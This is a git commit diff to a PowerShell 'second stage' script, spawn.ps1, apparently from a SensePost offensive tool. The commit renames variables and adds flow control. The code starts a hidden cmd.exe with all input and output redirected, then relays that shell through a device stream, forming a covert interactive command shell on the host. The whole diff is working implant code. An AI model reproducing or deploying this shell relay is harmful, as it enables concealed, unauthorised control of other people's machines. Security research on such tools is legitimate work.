0c507901abe2427f845b1edd61dd28970c9e1d96
Rogan Dawes <rogan@sensepost.com>
2016-07-26 16:09:02 +0200

    Rewritten spawn to handle flow control
    Renamed most of the variables in the process to make it clear what
    each one is doing. Size is less of a constraint in the second stage
    scripts!

--- powershell/spawn.ps1
+++ powershell/spawn.ps1
@@ -1,58 +1,68 @@
 function spawn() {
 	$p = New-Object -TypeName System.Diagnostics.Process
-    $i = $p.StartInfo
+	$i = $p.StartInfo
 	$i.CreateNoWindow = $true
 	$i.UseShellExecute = $false
 	$i.RedirectStandardInput = $true
 	$i.RedirectStandardOutput = $true
 	$i.RedirectStandardError = $true
-    $i.FileName = "cmd.exe"
+	$i.FileName = "cmd.exe"
 	$i.Arguments = "/c cmd.exe /k 2>&1 "
 	$null = $p.Start()
 	return $p
 }
 
-function connect($f, $r, $w) {
-	$sb = New-Object Byte[] ($M+1)
-	$fb = New-Object Byte[] ($M+1)
+function connect($device, $stdout, $stdin) {
+	$stdout_buffer = New-Object Byte[] ($M+1)
+	$device_buffer = New-Object Byte[] ($M+1)
+	$empty_buffer = New-Object Byte[] ($M+1)
 
-	$st = $r.BeginRead($sb, 2, ($M-1), $null, $null)
-	$ft = $f.BeginRead($fb, 0, ($M+1), $null, $null)
+	$stdout_task = $stdout.BeginRead($stdout_buffer, 2, ($M-1), $null, $null)
+	$device_task = $device.BeginRead($device_buffer, 0, ($M+1), $null, $null)
 
-	$stotal = 0
-	$ftotal = 0
+	$stdout_total = 0
+	$device_total = 0
 	Write-Output "Entering main loop"
-	while ($st -ne $null -and $ft -ne $null) {
+	$device.Write($empty_buffer, 0, $M+1)
+	while ($stdout_task -ne $null -and $device_task -ne $null) {
 		try {
-			if ($st.IsCompleted) {
-				$sbr = $r.EndRead($st)
-				if ($sbr -gt 0) {
-					$stotal += $sbr
-					[string]::Format( "Socket {0} - Device {1}", $stotal, $ftotal)
-					$sb[1] = $sbr
-					$f.Write($sb, 0, $M+1)
-					$f.Flush()
-					$st = $r.BeginRead($sb, 2, ($M-1), $null, $null)
+			if (!$can_write) { [System.Console]::Write("!") }
+			if ($stdout_task.IsCompleted) {
+				if ($can_write) {
+					$stdout_bytes_read = $stdout.EndRead($stdout_task)
+					if ($stdout_bytes_read -gt 0) {
+						$stdout_total += $stdout_bytes_read
+						# [string]::Format( "Socket {0} - Device {1}", $stdout_total, $device_total)
+						$stdout_buffer[1] = $stdout_bytes_read
+						$device.Write($stdout_buffer, 0, $M+1)
+						$device.Flush()
+						$stdout_task = $stdout.BeginRead($stdout_buffer, 2, ($M-1), $null, $null)
+					} else { # process closed?
+						$stdout_task = $null
+					}
 				} else {
-					$st = $null
+					[System.Console]::Write("x")
 				}
-			} elseif ($ft.IsCompleted) {
-				$fbr = $f.EndRead($ft)
-				if ($fbr -gt 0) {
-					$ftotal += $fb[1]
-					[string]::Format( "Socket {0} - Device {1}", $stotal, $ftotal)
-					$swo = $w.Write($fb, 2, $fb[1])
-					$w.Flush()
-					$ft = $f.BeginRead($fb, 0, ($M+1), $null, $null)
+			} elseif ($device_task.IsCompleted) {
+				$device_bytes_read = $device.EndRead($device_task)
+				if ($device_bytes_read -gt 0) {
+					$can_write = (($device_buffer[1] -band 128) -ne 128)
+					$device_buffer[1] = $device_buffer[1] -band ($M-1)
+					$device_total += $device_buffer[1]
+					# [string]::Format( "Socket {0} - Device {1}", $stdout_total, $device_total)
+					$stdin.Write($device_buffer, 2, $device_buffer[1])
+					$stdin.Flush()
+					$device_task = $device.BeginRead($device_buffer, 0, ($M+1), $null, $null)
 				} else {
-					$ft = $null
+					$device_task = $null
 				}
+				$device.Write($empty_buffer, 0, $M+1)
 			} else {
 				Start-Sleep -m 1
 			}
 		} catch {
 			$ErrorMessage = $_.Exception.Message
-		    $FailedItem = $_.Exception.ItemName
+			$FailedItem = $_.Exception.ItemName
 			Write-Output "Exception caught, terminating main loop"
 			Write-Output $ErrorMessage
 			Write-Output $FailedItem
